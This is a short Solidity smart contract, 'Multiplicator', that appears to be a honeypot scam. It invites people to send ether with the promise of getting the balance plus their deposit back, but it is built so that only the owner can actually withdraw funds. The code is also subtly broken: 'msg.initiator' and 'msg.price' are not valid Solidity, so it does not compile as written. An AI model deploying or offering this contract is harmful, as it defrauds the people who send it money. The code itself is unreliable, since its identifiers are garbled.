// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.initiator;

    function()payable{}

    function redeemTokens()
    payable
    public
    {
        require(msg.initiator == Owner);
        Owner.transfer(this.balance);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.price>=this.balance)
        {
            adr.transfer(this.balance+msg.price);
        }
    }
}